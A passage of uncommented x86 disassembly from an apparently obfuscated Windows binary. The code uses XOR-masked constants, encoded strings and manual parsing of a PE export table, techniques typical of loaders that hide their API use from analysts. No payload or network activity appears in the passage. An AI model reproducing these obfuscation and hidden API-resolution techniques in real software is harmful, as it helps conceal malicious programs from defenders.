  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
